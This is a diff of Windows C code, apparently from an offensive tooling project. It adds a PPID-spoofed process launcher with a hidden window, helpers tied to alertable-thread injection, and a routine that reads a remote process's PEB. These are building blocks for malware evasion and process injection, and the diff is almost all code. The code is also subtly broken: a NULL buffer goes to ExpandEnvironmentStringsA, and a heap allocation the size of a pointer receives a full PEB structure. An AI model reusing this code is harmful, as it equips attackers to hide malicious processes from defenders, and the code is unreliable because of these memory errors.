@@ -544,26 +544,27 @@ BOOL CreateAlertableThread(IN HANDLE hProcess, IN DWORD dwAlertableFunction, OUT
 	return TRUE;
 }
 
-BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwProcessId)
+BOOL CreateNewProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwProcessId)
 {
 	PROCESS_INFORMATION Pi = { 0 };
 	STARTUPINFO Si = { 0 };
-	char ProcessPath[MAX_PATH * 4];
-	char winDir[MAX_PATH * 2];
+	LPSTR lpEnv = NULL;
+	CHAR AbsoluteProcessName[MAX_PATH * 4];
 
 	Si.cb = sizeof(STARTUPINFO);
 
-	if (!IsAbsolutePath(lpProcessName))
+	// Prepend C:\Windows\System32 to the relative process name
+	if (PathIsRelativeA(lpProcessName))
 	{
-		if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
-			return ReportErrorWinAPI("GetEnvironmentVariableA");
-		sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\System32\\%s", winDir, lpProcessName);
+		ExpandEnvironmentStringsA("%windir%", lpEnv, MAX_PATH);
+		snprintf(AbsoluteProcessName, MAX_PATH * 4, "%s\\System32\\%s", lpEnv, lpProcessName);
+		lpProcessName = AbsoluteProcessName;
 	}
 
-	printf("[i] Creating process %s\n", ProcessPath);
+	printf("[i] Creating process %s\n", lpProcessName);
 	if (!CreateProcessA(
 		NULL,
-		ProcessPath,
+		lpProcessName,
 		NULL,
 		NULL,
 		FALSE,
@@ -582,28 +583,37 @@ BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hP
 	return TRUE;
 }
 
-BOOL RunPPIDSpoofedProcess(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread)
+BOOL CreatePPIDSpoofedProcess(IN DWORD dwCreationFlags, IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	HANDLE hParentProcess;
 	DWORD dwParentProcessId;
 	PROCESS_INFORMATION Pi = { 0 };
 	STARTUPINFOEXA SiEx = { 0 };
-	char ProcessPath[MAX_PATH * 4];
-	char winDir[MAX_PATH * 2];
-	char System32[MAX_PATH * 2];
 	SIZE_T sThreadAttList;
 	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList;
+	CHAR lpEnv[MAX_PATH], System32[MAX_PATH*2], AbsoluteProcessName[MAX_PATH * 4];
 
 	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
-	// Append C:\\Windows\\System32 to the relative process name
+	// Prepend C:\Windows\System32 to the relative process name
 	if (PathIsRelativeA(lpProcessName))
 	{
-		if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
-			return ReportErrorWinAPI("GetEnvironmentVariableA");
-		sprintf_s(System32, MAX_PATH * 2, "%s\\System32", winDir);
-		sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\%s", System32, lpProcessName);
-		lpProcessName = ProcessPath;
+		ExpandEnvironmentStringsA("%windir%", lpEnv, MAX_PATH);
+		snprintf(System32, MAX_PATH * 2, "%s\\System32", lpEnv);
+		snprintf(AbsoluteProcessName, MAX_PATH * 4, "%s\\%s", System32, lpProcessName);
+		lpProcessName = AbsoluteProcessName;
+	}
+	// Otherwise just get the path before the process name
+	else
+	{
+		char* tmp = strrchr(lpProcessName, '\\');
+		if (tmp)
+		{
+			int index = tmp - lpProcessName;
+			for (int i = 0; i < index; i++)
+				System32[i] = *(lpProcessName + i);
+			System32[index] = '\0';
+		}
 	}
 
 	if (!ObtainProcessHandle(ENUMPROCESSES, lpParentProcessName, &hParentProcess, &dwParentProcessId))
@@ -627,20 +637,40 @@ BOOL RunPPIDSpoofedProcess(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessNam
 		NULL,
 		NULL,
 		FALSE,
-		EXTENDED_STARTUPINFO_PRESENT,
+		EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | dwCreationFlags,
 		NULL,
 		System32,
 		&SiEx.StartupInfo,
 		&Pi
 	))
 		return ReportErrorWinAPI("CreateProcessA");
-	printf("[i] Created process %s with PID %d with spoofed parent process %s\n", ProcessPath, Pi.dwProcessId, lpParentProcessName);
+	printf("[i] Created process '%s' with PID %d with spoofed parent process %s\n", lpProcessName, Pi.dwProcessId, lpParentProcessName);
 
 	DeleteProcThreadAttributeList(pThreadAttList);
 	CloseHandle(hParentProcess);
 
 	*hProcess = Pi.hProcess;
 	*hThread = Pi.hThread;
+
+	return TRUE;
+}
+
+BOOL RetrievePEB(IN HANDLE hProcess, OUT PVOID* pPebAddress, OUT PPEB* pPeb)
+{
+	PROCESS_BASIC_INFORMATION PBI = { 0 };
+	SIZE_T sPBILen, sPEBLen;
+	NTSTATUS STATUS;
+	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+	if ((STATUS = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &sPBILen)) != 0)
+		return ReportErrorNTAPI("NtQueryInformationProcess", STATUS);
+
+	*pPeb = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PPEB));
+	if (!ReadProcessMemory(hProcess, PBI.PebBaseAddress, *pPeb, sizeof(PEB), &sPEBLen))
+		return ReportErrorWinAPI("ReadProcessMemory");
+
+	*pPebAddress = PBI.PebBaseAddress;
+	printf("[i] Retrieved PEB at 0x%p\n", *pPebAddress);
 
 	return TRUE;
 }
